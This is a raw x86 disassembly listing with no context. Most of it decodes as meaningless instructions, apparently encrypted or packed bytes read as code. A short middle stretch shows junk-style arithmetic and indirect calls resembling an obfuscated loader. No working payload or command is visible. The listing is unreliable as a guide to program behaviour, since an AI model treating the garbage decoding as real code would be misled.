  40220f:	xchg   ebp,eax
  402210:	sub    al,ah
  402212:	out    0xca,al
  402214:	lea    eax,[esi+0x6d0b4b81]
  40221a:	in     al,dx
  40221b:	out    dx,eax
  40221c:	enter  0xf77a,0xc2
  402220:	lods   eax,DWORD PTR ds:[esi]
  402221:	ret    
  402222:	lods   eax,DWORD PTR gs:[esi]
  402224:	jb     0x402293
  402226:	sbb    DWORD PTR [edi],esp
  402228:	icebp  
  402229:	retf   
  40222a:	repz inc edx
  40222c:	cwde   
  40222d:	test   DWORD PTR [edx+0x77660809],edx
  402233:	ror    DWORD PTR [ebx+edi*1+0x4f2ba590],0x3a
  40223b:	retf   
  40223c:	adc    ebp,DWORD PTR [esi-0x700881c3]
  402242:	xchg   ecx,eax
  402243:	test   dl,dl
  402245:	(bad)  [edi+0x283dd58b]
  40224b:	in     al,dx
  40224c:	aam    0xd6
  40224e:	mov    esp,0x58d56520
  402253:	pop    esi
  402254:	xchg   BYTE PTR [esi+0x32],ah
  402257:	dec    esp
  402258:	fldcw  WORD PTR [ecx+0x7d30e17]
  40225e:	and    eax,0x50a5be44
  402263:	hlt    
  402264:	cdq    
  402265:	ror    ch,1
  402267:	sar    BYTE PTR [ecx],0xc1
  40226a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40226b:	mov    ds:0xaf5563be,al
  402270:	pushf  
  402271:	(bad)  
  402272:	cmp    eax,0xda0675af
  402277:	sub    DWORD PTR [edi-0x31],edx
  40227a:	retf   0xab
  40227d:	das    
  40227e:	sub    al,0x3f
  402280:	xor    al,0x92
  402282:	fnstcw WORD PTR [ebx]
  402284:	jmp    0x402296
  402286:	mov    edx,0x17ea308a
  40228b:	adc    DWORD PTR [ebp+0x4a9297e],esp
  402291:	ins    BYTE PTR es:[edi],dx
  402292:	call   0x2ed68af2
  402297:	jmp    0x38ed:0xb76a581e
  40229e:	push   cs
  40229f:	push   edi
  4022a0:	cmp    BYTE PTR [edx+0x4c],bl
  4022a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022a4:	je     0x40229e
  4022a6:	(bad)  
  4022a7:	xor    eax,0x78a74029
  4022ac:	jle    0x402319
  4022ae:	pop    es
  4022af:	mov    ah,BYTE PTR [ecx]
  4022b1:	in     eax,dx
  4022b2:	enter  0x53cf,0xec
  4022b6:	out    dx,al
  4022b7:	xchg   edx,eax
  4022b8:	dec    ecx
  4022b9:	mov    eax,0x14c65f3
  4022be:	xchg   DWORD PTR [esi+0x8],esi
  4022c1:	pand   mm6,mm6
  4022c4:	fucompp 
  4022c6:	out    0x37,al
  4022c8:	and    BYTE PTR [ebx+0xe7a9409],bh
  4022ce:	(bad)  
  4022cf:	jecxz  0x4022b8
  4022d1:	pop    esi
  4022d2:	mov    eax,ds:0x86e9af70
  4022d7:	repnz cmp eax,DWORD PTR [ecx+eiz*4]
  4022db:	out    dx,eax
  4022dc:	adc    ebp,ebp
  4022de:	hlt    
  4022df:	sub    al,0x8c
  4022e1:	mov    esi,0x13064750
  4022e6:	jle    0x4022c5
  4022e8:	inc    esp
  4022e9:	cld    
  4022ea:	fisttp WORD PTR [ecx+0x6b]
  4022ed:	jbe    0x4022af
  4022ef:	sbb    eax,0xfbeb528e
  4022f4:	xchg   edi,eax
  4022f5:	cmc    
  4022f6:	xor    ch,BYTE PTR [edx+edi*4+0x3c4c12bd]
  4022fd:	sub    esi,DWORD PTR [edx+0x209d226d]
  402303:	push   es
  402304:	push   ebp
  402305:	sbb    eax,0xffc72594
  40230a:	mov    ch,0x66
  40230c:	fwait
  40230d:	and    DWORD PTR [edi-0x5fdccefb],ebp
  402313:	out    dx,al
  402314:	cwde   
  402315:	inc    ebp
  402316:	ja     0x4022a9
  402318:	aam    0xbb
  40231a:	int    0x71
  40231c:	push   edx
  40231d:	mov    dl,0x17
  40231f:	sbb    al,0x11
  402321:	ja     0x4022f2
  402323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402325:	sti    
  402326:	mov    eax,ds:0xd107bb13
  40232b:	mov    esi,0x51742d5f
  402330:	(bad)  
  402331:	hlt    
  402332:	mov    edx,0x3aef821c
  402337:	fisttp DWORD PTR [ecx+0xe0dc6cd]
  40233d:	mov    DWORD PTR [ecx-0x1d1fc2ce],esi
  402343:	pop    ds
  402344:	push   esp
  402345:	nop
  402346:	cmp    BYTE PTR [ebp+0x41],bh
  402349:	(bad)  
  40234b:	shl    BYTE PTR [ebx],1
  40234d:	lahf   
  40234e:	add    DWORD PTR [esi-0x15bdfa51],0x7b9c7f7d
  402358:	popf   
  402359:	(bad)  
  40235a:	cmp    dl,bh
  40235c:	jne    0x40238a
  40235e:	ins    DWORD PTR es:[edi],dx
  40235f:	imul   eax,DWORD PTR [ebx+0x4c],0xc360f340
  402366:	(bad)  
  402367:	jmp    0x4023a7
  402369:	mov    eax,0x4cb70fd8
  40236e:	mov    ebx,0x46e8417c
  402373:	push   edx
  402374:	cwde   
  402375:	mov    es,WORD PTR [ecx-0x48]
  402378:	pop    ecx
  402379:	mov    edx,0x9a4c3bbb
  40237e:	dec    ecx
  40237f:	inc    esi
  402380:	(bad)  
  402381:	adc    al,0x29
  402383:	jbe    0x4023ec
  402385:	cmp    ah,bh
  402387:	repz xchg esi,eax
  402389:	jb     0x40232a
  40238b:	ins    DWORD PTR es:[edi],dx
  40238c:	pop    esi
  40238d:	add    DWORD PTR [ebx],ebx
  40238f:	test   BYTE PTR [esi+ebx*2-0x55972c88],0x61
  402397:	pop    es
  402398:	das    
  402399:	dec    ebp
  40239a:	je     0x4023e7
  40239c:	push   0xffffffd6
  40239e:	loop   0x402331
  4023a0:	aas    
  4023a1:	fwait
  4023a2:	das    
  4023a3:	shl    DWORD PTR [edx+0x3],1
  4023a6:	add    DWORD PTR [edx],0xffffffce
  4023a9:	cmc    
  4023aa:	std    
  4023ab:	push   eax
  4023ad:	inc    edi
  4023ae:	jp     0x4023c5
  4023b0:	add    DWORD PTR ds:0x4c95d5ed,ebp
  4023b6:	sbb    ecx,DWORD PTR [esp+ebx*2]
  4023b9:	adc    BYTE PTR [eax],dh
  4023bb:	mov    edi,0x66effe53
  4023c0:	(bad)
  4023c5:	jo     0x402393
  4023c7:	(bad)  
  4023c8:	sbb    BYTE PTR [esi],bh
  4023ca:	mov    WORD PTR [esi+0x60567821],ds
  4023d0:	jb     0x402412
  4023d2:	jno    0x402451
  4023d4:	pop    edx
  4023d5:	push   esi
  4023d6:	sbb    al,0xa2
  4023d8:	aas    
  4023d9:	fcomp  st(0)
  4023db:	jge    0x40240a
  4023dd:	(bad)  [ebp+0x33460da]
  4023e3:	sbb    al,0x1a
  4023e5:	push   ebx
  4023e6:	sub    DWORD PTR [edx],ebp
  4023e8:	fild   WORD PTR [esi]
  4023ea:	lds    ebp,FWORD PTR [ebp-0x45]
  4023ed:	leave  
  4023ee:	retf   
  4023ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f0:	popf   
  4023f1:	sahf   
  4023f2:	ret    0xd78e
  4023f5:	add    DWORD PTR [edx],eax
  4023f7:	ss xchg edx,eax
  4023f9:	lea    ebx,[edi]
  4023fb:	adc    al,0x2d
  4023fd:	cmc    
  4023fe:	push   0xf
  402400:	and    BYTE PTR ds:0x76acf829,ch
  402406:	cdq    
  402407:	push   edi
  402408:	mov    bl,0xba
  40240a:	add    DWORD PTR [esi-0x5e48757b],esp
  402410:	data16 je 0x402442
  402413:	xchg   ebx,eax
  402414:	shl    DWORD PTR [ebx],cl
  402416:	ret    
  402417:	push   ecx
  402418:	add    ecx,DWORD PTR [esi+ebx*4]
  40241b:	xor    BYTE PTR [esp+ecx*8+0x47db5429],cl
  402422:	xchg   ecx,eax
  402423:	mov    ch,0x82
  402425:	xor    DWORD PTR [ebx],edi
  402427:	pop    ebp
  402428:	dec    ecx
  402429:	sbb    al,ah
  40242b:	js     0x402493
  40242d:	mov    bl,0xac
  40242f:	pop    ecx
  402430:	sti    
  402431:	lods   al,BYTE PTR ds:[esi]
  402432:	xchg   edx,eax
  402433:	push   eax
  402434:	(bad)  
  402435:	xor    eax,0xba1b385b
  40243a:	(bad)  
  40243b:	mov    ebp,esi
  40243d:	fisttp QWORD PTR [eax-0x5c]
  402440:	xchg   edx,eax
  402441:	lods   eax,DWORD PTR ds:[esi]
  402442:	loope  0x402441
  402444:	push   0x94d393c7
  402449:	xor    al,0x68
  40244b:	sub    DWORD PTR [edi-0x7],eax
  40244e:	adc    esi,ebp
  402450:	mov    edi,0x6ef39d45
  402455:	push   edi
  402456:	pop    ebp
  402457:	data16 fadd st,st(2)
  40245a:	mov    bh,0x2
  40245c:	push   esp
  40245d:	cmp    ebp,esp
  40245f:	mov    bh,0xb4
  402461:	cmp    eax,0x2d5066e6
  402466:	fsub   QWORD PTR [ebx]
  402468:	ret    0x511a
  40246b:	dec    edi
  40246c:	push   ecx
  40246d:	loop   0x402470
  40246f:	stos   DWORD PTR es:[edi],eax
  402470:	jb     0x402442
  402472:	add    al,0x17
  402474:	inc    esp
  402475:	pop    ds
  402476:	dec    ecx
  402477:	lea    eax,[edx-0x35fbbf77]
  40247d:	pop    edi
  40247e:	push   0x10
  402480:	and    eax,0x8526f0b2
  402485:	daa    
  402486:	xchg   ecx,eax
  402487:	sub    bh,BYTE PTR [esi+0x4b459ceb]
  40248d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40248e:	shl    DWORD PTR [eax],cl
  402490:	inc    eax
  402491:	lds    ebx,FWORD PTR [eax]
  402493:	inc    eax
  402494:	sbb    al,bl
  402496:	jg     0x402473
  402498:	sub    eax,0x904818f3
  40249d:	push   cs
  40249e:	mov    ds:0xf2c0ea30,al
  4024a3:	int    0xfe
  4024a5:	mov    al,ds:0x1728afc9
  4024aa:	test   BYTE PTR [ecx],bl
  4024ac:	rol    BYTE PTR [edi+0x2],1
  4024af:	and    BYTE PTR [ecx-0x30619e63],0x5d
  4024b6:	mov    ebx,0x792d1bc9
  4024bb:	or     ebp,edi
  4024bd:	sbb    al,0xe7
  4024bf:	jecxz  0x4024c3
  4024c1:	xchg   DWORD PTR [edx+0x733fa7e6],eax
  4024c7:	ffree  st(4)
  4024c9:	jmp    0xd315:0xbfc103c1
  4024d0:	(bad)  
  4024d1:	xchg   edx,eax
  4024d2:	sub    al,0xf
  4024d4:	sti    
  4024d5:	sbb    ch,BYTE PTR [eax+0x1736acb5]
  4024db:	push   cs
  4024dc:	popf   
  4024dd:	in     eax,0xed
  4024df:	mov    al,0x52
  4024e1:	repz cdq 
  4024e3:	sub    ecx,edx
  4024e5:	push   0xfb7ca45f
  4024ea:	sbb    DWORD PTR [edx+edx*4+0x35],esi
  4024ee:	pop    ds
  4024ef:	jecxz  0x402525
  4024f1:	hlt    
  4024f2:	cmp    DWORD PTR [ecx],ebx
  4024f4:	mov    dh,0xe7
  4024f6:	xchg   esi,eax
  4024f7:	and    al,0xfc
  4024f9:	pop    es
  4024fa:	add    ecx,eax
  4024fc:	loope  0x402505
  4024fe:	or     DWORD PTR [esi+0x1],ecx
  402501:	(bad)  
  402502:	jbe    0x4024a8
  402504:	cmp    ch,BYTE PTR [eax+0x39]
  402507:	add    BYTE PTR [ecx+0x2d8dc68d],cl
  40250d:	addr16 jne 0x402572
  402510:	ja     0x4024f1
  402512:	xor    al,0x8e
  402514:	stos   BYTE PTR es:[edi],al
  402515:	pop    es
  402516:	test   cl,ch
  402518:	gs push ebp
  40251a:	adc    BYTE PTR [ebp-0x17e03046],bl
  402520:	loope  0x402539
  402522:	jecxz  0x40256d
  402524:	out    0xa6,eax
  402526:	(bad)  
  402527:	mov    dl,0xaa
  402529:	aam    0xd6
  40252b:	adc    BYTE PTR [ebx+0x6],ch
  40252e:	popf   
  40252f:	push   ds
  402530:	loopne 0x4025a5
  402532:	add    BYTE PTR ds:0x887b9ed0,dl
  402538:	cmp    al,0x46
  40253a:	retf   
  40253b:	pop    esp
  40253c:	mov    esp,ecx
  40253e:	call   0x1aa3358
  402543:	push   edx
  402544:	hlt    
  402545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402546:	mov    ds:0x62bb8de0,eax
  40254b:	pop    ecx
  40254c:	clc    
  40254d:	sub    DWORD PTR [ecx],ecx
  40254f:	jmp    0x608177
  402554:	cmp    al,ch
  402556:	into   
  402557:	xchg   ecx,eax
  402558:	sub    BYTE PTR [eax-0x3300c39a],al
  40255e:	lods   eax,DWORD PTR ds:[esi]
  40255f:	mov    ds:0x6b4be686,al
  402564:	xor    eax,0x1d41fa6
  402569:	ror    DWORD PTR [eax-0xe80d45e],cl
  40256f:	mov    dl,0x3e
  402571:	lods   al,BYTE PTR ds:[esi]
  402572:	fs into 
  402574:	aas    
  402575:	ret    
  402576:	xor    eax,0x95217594
  40257b:	jmp    0x267efcf5
  402580:	pop    eax
  402581:	mov    bl,0x9c
  402583:	fdiv   QWORD PTR [ebx+eax*1-0x38efb513]
  40258a:	call   0x18505655
  40258f:	sub    BYTE PTR [edi-0x64],bh
  402592:	jae    0x40260c
  402594:	out    dx,al
  402595:	fst    DWORD PTR [edx+ebx*4+0x67]
  402599:	adc    bh,BYTE PTR ds:0x7b32a162
  40259f:	dec    esi
  4025a0:	or     eax,0x15f1bfce
  4025a5:	call   0x5060:0x146497ce
  4025ac:	mov    edi,0x68d6435e
  4025b1:	popf   
  4025b2:	loope  0x4025c4
  4025b4:	dec    edx
  4025b5:	enter  0x4733,0x59
  4025b9:	loopne 0x402595
  4025bb:	out    dx,al
  4025bc:	sub    DWORD PTR [ebp+0x15],esi
  4025bf:	dec    esi
  4025c0:	or     eax,0xaaac8db0
  4025c5:	jp     0x402560
  4025c7:	es pop eax
  4025c9:	jbe    0x4025a2
  4025cb:	and    edi,esi
  4025cd:	pop    edi
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x42835f
  4025dc:	adc    DWORD PTR ds:0x4281eb,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x4281d3,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x4281c7,0x0
  4025fd:	mov    DWORD PTR ds:0x428373,0x76b5
  402607:	mov    DWORD PTR ds:0x4281cf,edx
  40260d:	mov    DWORD PTR ds:0x4282e7,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x4282d3
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x4281c7,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42829f
  402645:	call   DWORD PTR ds:0x428dfc
  40264b:	sbb    DWORD PTR ds:0x4283eb,0x36f
  402655:	adc    DWORD PTR ds:0x42836f,0x4281f7
  40265f:	sub    DWORD PTR ds:0x4283df,0x42837b
  402669:	and    DWORD PTR ds:0x4281bf,0x4282ab
  402673:	add    DWORD PTR ds:0x42837f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x4281c7
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x4281bb,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x4282ef,0x0
  4026b7:	mov    DWORD PTR ds:0x42834f,edx
  4026bd:	mov    DWORD PTR ds:0x4282ab,ecx
  4026c3:	mov    DWORD PTR ds:0x4281d3,edx
  4026c9:	mov    DWORD PTR ds:0x4282cf,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x4281bb
  4026dd:	mov    DWORD PTR ds:0x4282ef,edx
  4026e3:	cmp    DWORD PTR ds:0x4282ef,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428e00
  402708:	add    DWORD PTR ds:0x4282f7,0x428357
  402712:	sub    DWORD PTR ds:0x428373,0x6e4a
  40271c:	xor    DWORD PTR ds:0x4281cb,0x16a6
  402726:	dec    DWORD PTR ds:0x4281e7
  40272c:	and    DWORD PTR ds:0x4282cb,edx
  402732:	or     DWORD PTR ds:0x42835b,edx
  402738:	mov    eax,ds:0x4281ef
  40273d:	and    DWORD PTR ds:0x428403,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428403
  402751:	sbb    DWORD PTR ds:0x4282cf,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x4282af,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428363
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x29405aaa
  4027a0:	stos   BYTE PTR es:[edi],al
  4027a1:	xor    ah,bh
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [eax-0x41],bh
  4027ab:	dec    esi
  4027ac:	daa    
  4027ad:	imul   ebp,esp,0x61
  4027b0:	mov    cl,0x86
  4027b2:	pop    edi
  4027b3:	mov    DWORD PTR [ebx],eax
  4027b5:	and    BYTE PTR [eax+0x2f4b72aa],cl
  4027bb:	jmp    0x361f:0x871c2a1d
  4027c2:	jb     0x4027dc
  4027c4:	jns    0x40275d
  4027c6:	popa   
  4027c7:	pop    edx
  4027c8:	std    
  4027c9:	mov    ecx,0x2836bf7e
  4027ce:	in     eax,dx
  4027cf:	sahf   
  4027d0:	mov    ah,0xa8
  4027d2:	xchg   ebx,eax
  4027d3:	and    esp,ebx
  4027d5:	jns    0x4027d2
  4027d7:	mov    WORD PTR ds:0x65ec163b,fs
  4027dd:	or     al,0x86
  4027df:	jecxz  0x40279c
  4027e1:	mov    esi,0xcad3cf68
  4027e6:	xor    eax,0xc2cb98ba
  4027eb:	rcl    DWORD PTR [esi-0x4195a38],cl
  4027f1:	mov    esi,DWORD PTR [esi-0x7a]
  4027f4:	mov    ebx,0xa3d74c0d
  4027f9:	mov    ds:0x3c8cd258,al
  4027fe:	jp     0x4027b0
  402800:	int    0x82
  402802:	loopne 0x402808
  402804:	pop    ds
  402805:	add    DWORD PTR [edi],ebp
  402807:	or     eax,0xbf1bdf1
  40280c:	into   
  40280d:	push   esi
  40280e:	dec    ebx
  40280f:	imul   edx,edi,0x30
  402812:	lds    eax,FWORD PTR [ebp+0x2e]
  402815:	adc    cl,bh
  402817:	sub    eax,0x5f0af3e0
  40281c:	dec    ebx
  40281d:	push   0x1f4bfb52
  402822:	lock in eax,0xf
  402825:	lahf   
  402826:	adc    dl,dh
  402828:	rcl    DWORD PTR [esi+0x1405ac87],0xef
  40282f:	or     esp,DWORD PTR [ecx+0x72dad71]
  402835:	adc    bl,bh
  402837:	jmp    0x70a7:0x227d7bbb
  40283e:	cmc    
  40283f:	bound  esp,QWORD PTR [edx+esi*8-0x5013e4b5]
  402846:	add    al,0x7d
  402848:	add    ebx,DWORD PTR [edx]
  40284a:	add    al,0x42
  40284c:	mov    ebp,0xd6f06fbb
  402851:	xor    eax,0xd2cf363f
  402856:	pop    es
  402857:	add    dl,dh
  402859:	add    ah,BYTE PTR [eiz*2+0x230164ac]
  402860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402861:	mov    ?,ebp
  402863:	push   ss
  402864:	int    0x1f
  402866:	fistp  QWORD PTR [edi-0x45a48c10]
  40286c:	adc    esp,DWORD PTR [edi-0x4deb5b6f]
  402872:	sar    DWORD PTR [ebp-0x73],1
  402875:	mov    dl,0x1d
  402877:	popa   
  402878:	rcl    BYTE PTR [edx],cl
  40287a:	jnp    0x402881
  40287c:	and    DWORD PTR [edx-0x725948aa],edx
  402882:	inc    edi
  402883:	cmovp  dx,WORD PTR [ebp-0x4a]
  402888:	sub    ebx,ecx
  40288a:	(bad)  
  40288b:	mov    bl,0xd4
  40288d:	outs   dx,BYTE PTR ds:[esi]
  40288e:	dec    dl
  402890:	call   0x1172d612
  402895:	inc    edx
  402896:	pop    esp
  402897:	idiv   BYTE PTR [ecx+0x2f]
  40289a:	dec    ebx
  40289b:	jns    0x402855
  40289d:	cmp    eax,0xe526c0aa
  4028a2:	pop    edi
  4028a3:	mov    ecx,0xe90fad3c
  4028a8:	cdq    
  4028a9:	jb     0x402849
  4028ab:	in     al,0xd5
  4028ad:	jp     0x4028bc
  4028af:	xchg   ebp,eax
  4028b0:	call   0x4348d2f8
  4028b5:	xor    DWORD PTR [ecx-0x56],0xd665eb2f
  4028bc:	jg     0x4028a8
  4028be:	sub    eax,0x34950ce5
  4028c3:	int    0xa5
  4028c5:	sbb    DWORD PTR [edi-0x64],esp
  4028c8:	or     DWORD PTR [ebx+eiz*4],0xffffffdc
  4028cc:	loop   0x4028d7
  4028ce:	out    dx,eax
  4028cf:	sbb    ecx,esi
  4028d1:	shl    ecx,0xd8
  4028d4:	xor    BYTE PTR [eax],dl
  4028d6:	mov    al,ds:0x66261f0c
  4028dc:	jmp    0x84b5:0x6afbae75
  4028e3:	mov    ebx,0x12638a12
  4028e8:	ret    0xf397
  4028eb:	and    DWORD PTR [ebx-0x45b5f40f],esi
  4028f1:	xchg   ebp,eax
  4028f2:	ror    BYTE PTR [ebp+0x60],1
  4028f5:	(bad)  
  4028f6:	(bad)  
  4028f7:	lahf   
  4028f8:	lods   eax,DWORD PTR ds:[esi]
  4028f9:	jmp    0x8a4d:0xff63a83b
  402900:	dec    eax
  402901:	push   es
  402902:	or     edi,DWORD PTR [edi-0x6fd5596f]
  402908:	sbb    BYTE PTR [edx-0x15],ah
  40290b:	call   0x8ae6:0xb8bf111
  402912:	push   ecx
  402913:	dec    ecx
  402914:	mov    ebp,0xce922da4
  402919:	cmp    al,0x1f
  40291b:	outs   dx,BYTE PTR ds:[esi]
  40291c:	pop    edx
  40291d:	dec    edx
  40291e:	popa   
  40291f:	sahf   
  402920:	fsubr  DWORD PTR [edi]
  402922:	repz test eax,0xbc217ca0
  402928:	xchg   ebx,eax
  402929:	jnp    0x402901
  40292b:	push   edi
  40292c:	inc    esp
  40292d:	fwait
  40292e:	and    BYTE PTR [edi-0x5a717d40],bh
  402934:	jnp    0x4028ca
  402936:	(bad)  
  402937:	push   ds
  402938:	cmc    
  402939:	(bad)  
  40293a:	sub    eax,edi
  40293c:	xor    ebx,DWORD PTR [edi+ecx*2]
  40293f:	retf   
  402940:	add    al,0xf9
  402942:	clc    
  402943:	ret    0xf88c
  402946:	ins    DWORD PTR es:[edi],dx
  402947:	fnsave [edi-0x64]
  40294a:	enter  0x6f5f,0xc2
  40294e:	xchg   esp,eax
  40294f:	mov    DWORD PTR [esi-0x1a],ebx
  402952:	mov    al,0x5d
  402954:	sbb    ch,BYTE PTR [eax-0x48]
  402957:	jnp    0x40290f
  402959:	popf   
  40295a:	push   0x41
  40295c:	add    DWORD PTR ds:0x4e179928,esi
  402962:	jle    0x402937
  402964:	je     0x40299c
  402966:	fwait
  402967:	ret    0x2a4b
  40296a:	inc    edx
  40296b:	push   ebp
  40296c:	mov    edx,0x7c1b2792
  402971:	mov    DWORD PTR [eax+0x42],edi
  402974:	jmp    0x93e0:0xd9c21e77
  40297b:	mulps  xmm7,xmm0
  40297e:	pop    ebx
  40297f:	cmp    DWORD PTR [ecx-0xd],0x5461b9a
  402986:	push   ss
  402987:	ins    DWORD PTR es:[edi],dx
  402988:	data16 fbstp TBYTE PTR [edx+0x51]
  40298c:	iret   
  40298d:	mov    ds:0xa611eccb,eax
  402992:	loopne 0x402952
  402994:	arpl   WORD PTR [edi-0x4ac7c18e],bp
  40299a:	sbb    BYTE PTR [ebx+0x23],bl
  40299d:	(bad)  
  40299e:	in     al,0xc9
  4029a0:	int    0x9d
  4029a2:	arpl   WORD PTR [edi],bx
  4029a4:	sub    DWORD PTR [edi+edi*2-0x2310fba6],ebp
  4029ab:	iret   
  4029ac:	(bad)  
  4029ad:	jg     0x4029aa
  4029af:	mov    DWORD PTR [edx-0x4676fe1c],esp
  4029b5:	aaa    
  4029b6:	sub    DWORD PTR [eax],esp
  4029b8:	cmp    bh,ah
  4029ba:	push   esp
  4029bb:	pushf  
  4029bc:	xor    al,0xd9
  4029be:	fcmove st,st(5)
  4029c0:	mov    bh,0xc3
  4029c2:	(bad)  
  4029c3:	retf   0x56e2
  4029c6:	mov    cl,0x1f
  4029c8:	pusha  
  4029c9:	or     esp,eax
  4029cb:	loop   0x402a28
  4029cd:	xchg   ebp,eax
  4029ce:	and    eax,esi
  4029d0:	xchg   edx,eax
  4029d1:	cs push edi
  4029d3:	dec    ebx
  4029d4:	pop    es
  4029d5:	sbb    dl,ah
  4029d7:	mov    ds:0x28b32fd9,eax
  4029dc:	std    
  4029dd:	add    edx,DWORD PTR [edx-0x54]
  4029e0:	not    DWORD PTR [edx+0x30]
  4029e3:	test   DWORD PTR [edx-0x2d],0x56cee73b
  4029ea:	fsubr  DWORD PTR [edx-0x2e]
  4029ed:	jbe    0x402a25
  4029ef:	dec    edx
  4029f0:	or     BYTE PTR [esi],0x50
  4029f3:	mov    ch,0xda
  4029f5:	mov    al,0x62
  4029f7:	inc    esi
  4029f8:	inc    esp
  4029f9:	add    DWORD PTR [ebx+0x73de8693],ebx
  4029ff:	sub    esi,DWORD PTR ds:0xc727b0f1
  402a05:	call   0x1fe6:0x22a979ee
  402a0c:	imul   eax,DWORD PTR [edx-0x16],0xa8502e33
  402a13:	xor    ebx,DWORD PTR [eax+0x4654ca5]
  402a19:	shl    DWORD PTR [esi+0x57],0xbc
  402a1d:	fdivr  DWORD PTR [eax-0x28]
  402a20:	stos   BYTE PTR es:[edi],al
  402a21:	mov    al,ds:0x770bf19
  402a26:	daa    
  402a27:	shr    DWORD PTR [ebp+0x3b],0xaf
  402a2b:	ja     0x402a57
  402a2d:	push   0xffffffa8
  402a2f:	out    dx,eax
  402a30:	inc    esp
  402a31:	sti    
  402a32:	push   eax
  402a33:	xchg   ebx,eax
  402a34:	push   esp
  402a35:	jle    0x4029f8
  402a37:	(bad)  
  402a39:	mov    dl,0x8e
  402a3b:	repz (bad)
  402a3e:	add    eax,0xbb65816b
  402a43:	sbb    DWORD PTR [ecx-0x434b087a],0x4d
  402a4a:	pop    edi
  402a4b:	fwait
  402a4c:	jl     0x402a83
  402a4e:	cmp    ebp,DWORD PTR [edi]
  402a50:	or     BYTE PTR [ebp+0x32],dl
  402a53:	lds    esp,FWORD PTR [edi]
  402a55:	or     BYTE PTR [ecx+0x66965089],ah
  402a5b:	dec    ebx
  402a5c:	inc    eax
  402a5d:	mov    BYTE PTR [esi+0x16],ch
  402a60:	jno    0x4029ea
  402a62:	test   al,0x8f
  402a64:	jle    0x402aac
  402a66:	cmp    eax,0xb98c7ffa
  402a6b:	jno    0x402a03
  402a6d:	or     al,0xbf
  402a6f:	pop    ebp
  402a70:	mov    edx,0x62598578
  402a75:	lods   al,BYTE PTR ds:[esi]
  402a76:	sub    eax,0xe1a7ece5
  402a7b:	fidiv  DWORD PTR [eax+0x27957e3b]
  402a81:	rcr    DWORD PTR [ebp+0x76],cl
  402a84:	nop
  402a85:	repz cmp esi,DWORD PTR [ebx]
  402a88:	adc    BYTE PTR [ecx+0x21],al
  402a8b:	mov    ds:0x7f92cc18,eax
  402a90:	inc    bp
  402a92:	pop    esi
  402a93:	lea    ebp,[eax-0x48]
  402a96:	ss out dx,eax
  402a98:	out    dx,eax
  402a99:	mov    ch,0x95
  402a9b:	xor    esp,DWORD PTR [edi+ecx*2-0x61147ca5]
  402aa2:	jnp    0x402afe
  402aa4:	lea    ecx,[eax-0x52]
  402aa7:	pop    ebp
  402aa8:	jns    0x402b02
  402aaa:	or     al,0x80
  402aac:	push   ecx
  402aad:	in     al,dx
  402aae:	mov    ecx,ebp
  402ab0:	ss cld 
  402ab2:	and    ah,bh
  402ab4:	and    ch,al
  402ab6:	xor    eax,0xae112961
  402abb:	dec    ebx
  402abc:	add    al,0xbd
  402abe:	loope  0x402b23
  402ac0:	js     0x402a74
  402ac2:	inc    esp
  402ac3:	jmp    0xd0cf:0xeb54d6c4
  402aca:	mov    DWORD PTR [edx+0x12ae66ae],ebp
  402ad0:	pop    ecx
  402ad1:	xor    al,0xa1
  402ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ad4:	mov    bl,0x9
  402ad6:	inc    ecx
  402ad7:	sub    al,0x16
  402ad9:	test   eax,0xa726a83f
  402ade:	inc    esp
  402adf:	jle    0x402a98
  402ae1:	test   DWORD PTR [eax],esi
  402ae3:	cwde   
  402ae4:	pop    ss
  402ae5:	push   ss
  402ae6:	sahf   
  402ae7:	je     0x402b24
  402ae9:	popf   
  402aea:	scas   eax,DWORD PTR es:[edi]
  402aeb:	out    dx,eax
  402aec:	jl     0x402b29
